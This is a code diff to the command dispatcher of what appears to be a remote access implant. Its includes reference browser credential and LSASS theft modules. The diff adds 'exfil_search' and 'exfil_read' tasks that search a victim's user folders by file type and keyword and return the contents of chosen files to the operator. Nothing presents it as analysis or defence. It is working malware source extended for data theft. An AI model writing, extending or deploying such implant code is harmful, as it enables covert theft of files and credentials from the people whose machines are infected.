@@ -21,6 +21,7 @@
 #include "../../include/remote/desktop.h"
 #include "../../include/credentials/browser.h"
 #include "../../include/credentials/lsass.h"
+#include "../../include/exfil/exfil.h"
 
 /* ============================================================================
  * Parser JSON minimal
@@ -184,6 +185,10 @@ static command_type_t string_to_command(const char *cmd) {
     return CMD_SYSTEM_DUMP;
   if (str_icmp(cmd, "reg_creds") == 0)
     return CMD_REG_CREDS;
+  if (str_icmp(cmd, "exfil_search") == 0)
+    return CMD_EXFIL_SEARCH;
+  if (str_icmp(cmd, "exfil_read") == 0)
+    return CMD_EXFIL_READ;
 
   return CMD_NONE;
 }
@@ -667,6 +672,50 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
         result->output_len = result->output ? strlen(result->output) : 0;
         status = STATUS_FAILURE;
       }
+    }
+    break;
+
+  case CMD_EXFIL_SEARCH:
+    {
+      // Format args: "path,byExt,byKey,depth" (ex: "C:\\Users,1,1,5")
+      char path[MAX_PATH] = {0};
+      int byExt = 1, byKey = 1, depth = 5;
+      if (task->args) {
+        sscanf(task->args, "%259[^,],%d,%d,%d", path, &byExt, &byKey, &depth);
+      }
+      char* result_json = NULL;
+      if (Exfil_SearchFiles(path[0] ? path : NULL, byExt != 0, byKey != 0, depth, &result_json)) {
+        result->output = result_json;
+        result->output_len = result_json ? strlen(result_json) : 0;
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("File search failed");
+        result->output_len = result->output ? strlen(result->output) : 0;
+        status = STATUS_FAILURE;
+      }
+    }
+    break;
+
+  case CMD_EXFIL_READ:
+    {
+      // args = chemin du fichier
+      if (task->args && strlen(task->args) > 0) {
+        BYTE* file_data = NULL;
+        DWORD file_size = 0;
+        if (Exfil_ReadFile(task->args, &file_data, &file_size)) {
+          result->data = file_data;
+          result->data_len = file_size;
+          result->output = str_dup("File read successful");
+          status = STATUS_SUCCESS;
+        } else {
+          result->output = str_dup("Failed to read file");
+          status = STATUS_FAILURE;
+        }
+      } else {
+        result->output = str_dup("No file path provided");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
     }
     break;
 
